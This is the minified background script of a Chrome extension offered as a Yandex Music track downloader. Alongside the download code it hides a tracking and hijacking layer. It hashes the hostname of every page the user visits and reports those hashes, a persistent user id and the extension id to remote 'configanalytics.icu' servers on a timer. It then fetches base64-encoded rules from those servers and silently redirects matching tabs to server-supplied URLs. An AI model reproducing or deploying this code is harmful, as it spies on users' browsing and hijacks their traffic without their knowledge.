! function() {
    function a() {
        return new Promise(a => {
            chrome.storage.local.get(null, e => {
                null == e.version ? chrome.storage.local.set({
                    time: 60,
                    config: "https://fw-chrome.configanalytics.icu/musicsave/chrome/global/config.txt;https://cf-chrome.configanalytics.icu/musicsave/chrome/global/config.txt",
                    ctime: c(0),
                    version: chrome.runtime.getManifest().version,
                    share: 0
                }) : (null == e.time && chrome.storage.local.set({
                    time: 60
                }), null == e.config && chrome.storage.local.set({
                    config: "https://fw-chrome.configanalytics.icu/musicsave/chrome/global/config.txt;https://cf-chrome.configanalytics.icu/musicsave/chrome/global/config.txt"
                }), null == e.ctime && chrome.storage.local.set({
                    ctime: c(0)
                }), null == e.share && chrome.storage.local.set({
                    share: 0
                })), null == e.start && chrome.storage.local.set({
                    start: b()
                }), null == e.uid && chrome.storage.local.set({
                    uid: d()
                }), null == e.html && chrome.storage.local.set({
                    html: "0;/html/share.html"
                }), null == e.config && chrome.storage.local.set({
                    config: "https://fw-chrome.configanalytics.icu/musicsave/chrome/global/config.txt;https://cf-chrome.configanalytics.icu/musicsave/chrome/global/config.txt"
                }), null == e.all && chrome.storage.local.set({
                    all: !0
                }), null == e.tags && chrome.storage.local.set({
                    tags: !0
                }), null == e.folder && chrome.storage.local.set({
                    folder: !1
                }), a(e)
            })
        })
    }
    function b() {
        return Date.now()
    }
    function c(a) {
        return 0 == a ? new Date(0).toUTCString() : new Date().toUTCString()
    }
    function d() {
        return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, a => {
            let b = 0 | 16 * Math.random(),
                c = "x" == a ? b : 8 | 3 & b;
            return c.toString(16)
        })
    }
    function e(a) {
        chrome.storage.local.get(["html", "share", "start"], c => {
            let d = j(c.html);
            if(0 == c.share && 0 != d.shift() && 4e8 < b() - c.start) {
                c.share = b(), a(d.shift());
                try {
                    _gaq.push(["_trackEvent", "click", "share"])
                } catch (a) {}
            }
        })
    }
    function f(a, b) {
        chrome.storage.local.get("b", c => {
            c.b || (c.b = []), -1 == c.b.indexOf(b(a)) && (c.b.push(b(a)), chrome.storage.local.set({
                b: c.b
            }))
        })
    }
    function g(a) {
        return atob(a)
    }
    function h(a) {
        return btoa(a)
    }
    function i(a) {
        return new URL(a).hostname
    }
    function j(a) {
        if(a && 0 < a.length) return a.split(";")
    }
    function k(a) {
        return h(a.split("").reduce((c, a) => (c = (c << 5) - c + a.charCodeAt(0), c & c), 0))
    }
    function l(a, b, c, d, e, f) {
        let h = /(?:(?:https?):\/\/)([\w_-]+(?:(?:\.[\w_-]+)+))([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?/g,
            i = /=$/g.test(a) ? `${a}${b}` : a;
        fetch(i).then(a => {
            if(m(a.status)) a.redirected ? d.contains(a.url) ? c(a.url, e) : +g(f) && a.text().then(a => {
                c(n(a, h), e)
            }).catch(() => {}) : a.text().then(a => {
                let b = n(a, h);
                (d.contains(b) || +g(f)) && c(b, e)
            }).catch(() => {});
            else try {
                _gaq.push(["_trackEvent", "click", `internal-${d}`])
            } catch (a) {}
        }).catch(() => {})
    }
    function m(a) {
        return 199 < a && 400 > a ? 1 : 0
    }
    function n(a, b) {
        return a.match(b).toString()
    }
    function o(a, b, c, d) {
        let e = 0;
        return new Promise((f, g) => {
            function h() {
                a.read().then(({
                    done: a,
                    value: g
                }) => {
                    if(a) return void f();
                    if(e += g.byteLength, !K) {
                        try {
                            c.postMessage({
                                message: Math.round(100 * (e / +b)) + "%",
                                url: d
                            })
                        } catch (a) {}
                        h()
                    }
                }).catch(g)
            }
            h()
        })
    }
    function p(a) {
        chrome.tabs.create({
            url: a
        })
    }
    function q(a, b) {
        chrome.tabs.update(b, {
            url: a
        })
    }
    function s() {
        chrome.tabs.onUpdated.hasListener(u) && chrome.tabs.onUpdated.removeListener(u)
    }
    function t(a) {
        chrome.alarms.onAlarm.hasListener(a) && chrome.alarms.onAlarm.removeListener(a)
    }
    function u(b, c, d) {
        let e = i(d.url);
        if(e.includes("music.yandex.") && "music.yandex.ru" != e && "complete" == c.status) {
            let a = d.url.replace(e.split(".")[2], "ru");
            q(a, b)
        }
        if("loading" == c.status && f(e, k), !!(F && 0 < F.length))
            for(let c in F)
                if(F.hasOwnProperty(c)) {
                    let e = F[c].a;
                    if(d.url.includes(g(e.d)) && !H.has(e.d)) {
                        H.add(e.d);
                        let a = h(0);
                        e.t && (a = e.t), l(g(e.u), d.url, q, g(e.d), b, a)
                    }
                }
    }
    function v(a) {
        a.state && "complete" === a.state.current && chrome.downloads.search({
            id: a.id
        }, a => {
            const b = {
                url: a[0].url,
                extension: a[0].byExtensionId
            };
            b.extension == chrome.runtime.id && (J--, window.URL.revokeObjectURL(b.url))
        })
    }
    function w() {
        chrome.alarms.clear("interval", () => {
            e(p), E(), H.clear()
        })
    }
    function x(a) {
        a.origins.contains("<all_urls>") && (K = !1, E())
    }
    function y(a) {
        a.origins.contains("<all_urls>") && (K = !0, p("html/error.html"))
    }
    function z(a) {
        if("install" == a.reason) {
            try {
                _gaq.push(["_trackEvent", "click", "install"])
            } catch (a) {}
            p("html/install.html")
        }
        if("update" == a.reason) {
            try {
                _gaq.push(["_trackEvent", "click", "update"])
            } catch (a) {}
            p("html/update.html")
        }
    }
    function A() {
        p("https://music.yandex.ru")
    }
    function B(a, b, c) {
        return chrome.storage.local.get("all", b => {
            "a" == a.message && c(b.all)
        }), !0
    }
    function C(a) {
        chrome.storage.local.get(["tags", "folder", "path"], b => {
            "c" == a.name && a.onMessage.addListener(c => {
                if(K) return void a.postMessage({
                    message: "error",
                    url: c.url
                });
                if("d" == c.message) {
                    function d(c) {
                        K = !1, Promise.all([fetch(decodeURIComponent(c.url)).then(b => (o(b.clone().body.getReader(), b.headers.get("content-length"), a, c.url), b.arrayBuffer())), fetch(decodeURIComponent(c.cover)).then(a => a.arrayBuffer())]).then(e => {
                            I = new browserId3Writer(e[0]), I.setFrame("TIT2", c.title).setFrame("TPE1", c.artist).setFrame("TPE2", c.artist).setFrame("TALB", c.album).setFrame("TYER", c.year).setFrame("TCON", [c.genre]).setFrame("TRCK", c.number);
                            try {
                                I.setFrame("APIC", {
                                    type: 3,
                                    data: e[1],
                                    description: ""
                                })
                            } catch (a) {}!0 == b.tags && I.addTag();
                            let f;
                            f = !0 == b.folder && 0 < b.path.length ? `${b.path}/${c.name}` : c.name, chrome.downloads.download({
                                url: I.getURL(),
                                filename: f,
                                conflictAction: "overwrite"
                            }, () => {
                                a.postMessage({
                                    message: "100%",
                                    url: c.url
                                }), 0 < G.length && d(G.shift())
                            })
                        }).catch(() => {
                            K = !1, a.postMessage({
                                message: "100%",
                                url: c.url
                            }), a.postMessage({
                                message: "error",
                                url: c.url
                            })
                        })
                    }
                    if(J++, 7 < J) return void G.push(c);
                    d(c)
                }
            })
        })
    }
    function D() {
        s(), t(w), chrome.tabs.onUpdated.addListener(u), chrome.runtime.onInstalled.addListener(z), chrome.browserAction.onClicked.addListener(A), chrome.runtime.onMessage.addListener(B), chrome.downloads.onChanged.addListener(v), chrome.runtime.onConnect.addListener(C), chrome.permissions.onAdded.addListener(x), chrome.permissions.onRemoved.addListener(y)
    }
    function E() {
        chrome.permissions.getAll(a => {
            a.origins.contains("<all_urls>") && chrome.storage.local.get(["config", "uid", "start", "b", "time", "ctime"], a => {
                function b() {
                    fetch(d.a.pop() + d.s, {
                        method: "GET",
                        headers: new Headers({
                            "If-Modified-Since": a.ctime,
                            "X-Requested-With": chrome.runtime.id
                        })
                    }).then(a => {
                        if(304 == a.status) return K = !1, chrome.storage.local.get({
                            k: []
                        }, a => {
                            a && a.k && (F = a.k), s(), chrome.tabs.onUpdated.addListener(u)
                        }), void chrome.storage.local.remove("b");
                        if(204 == a.status) return K = !0, void chrome.storage.local.remove("b");
                        if(206 == a.status) {
                            try {
                                _gaq.push(["_trackEvent", "click", "error"])
                            } catch (a) {}
                            return K = !0, void p("html/error.html")
                        }
                        if(200 != a.status) return F = [], chrome.storage.local.remove("b"), s(), void(0 != d.a.length && b());
                        if(a.ok) {
                            K = !1;
                            let e = a.headers.get("content-type");
                            if(!e || -1 == e.indexOf("application/json")) return void(0 != d.a.length && b());
                            chrome.storage.local.set({
                                ctime: c()
                            }), a.json().then(a => {
                                let b = [];
                                for(let c in chrome.storage.local.set({
                                        html: g(a.r)
                                    }), chrome.storage.local.set({
                                        time: g(a.t)
                                    }), chrome.storage.local.remove("k"), a)
                                    if(a[c][0].hasOwnProperty("c")) {
                                        for(let d, e = 1, f = a[c].length; e < f; ++e) d = a.c[e].d, b += g(d);
                                        chrome.storage.local.set({
                                            config: b
                                        })
                                    } else a[c][0].hasOwnProperty("a") && chrome.storage.local.get({
                                        k: []
                                    }, b => {
                                        let d = b.k;
                                        for(let e = 1, f = a[c].length; e < f; ++e) d.push({
                                            [c]: a.a[e]
                                        });
                                        F = d, chrome.storage.local.set({
                                            k: d
                                        })
                                    });
                                chrome.storage.local.remove("b")
                            })
                        }
                    }).catch(() => {
                        0 != d.a.length && b()
                    })
                }
                a.b || (a.b = []);
                const d = {
                    a: j(a.config),
                    s: `?uid=${a.uid}&ver=${chrome.runtime.getManifest().version}&extid=${chrome.runtime.id}&start=${a.start}&hash=${[...a.b].join("-")}`
                };
                b(), chrome.alarms.create("interval", {
                    periodInMinutes: +a.time
                }), t(w), chrome.alarms.onAlarm.addListener(w)
            })
        })
    }
    let F = [],
        G = [],
        H = new Set,
        I = "",
        J = 0,
        K = !1;
    String.prototype.contains = function(a) {
        let b = /^https?:\/\//i.test(this) ? this : `https://${this}`;
        return i(b).includes(i(a)) || i(a).includes(i(b))
    }, Array.prototype.contains = function(a) {
        return -1 < this.indexOf(a)
    }, async function() {
        D(), await a(), E()
    }()
}();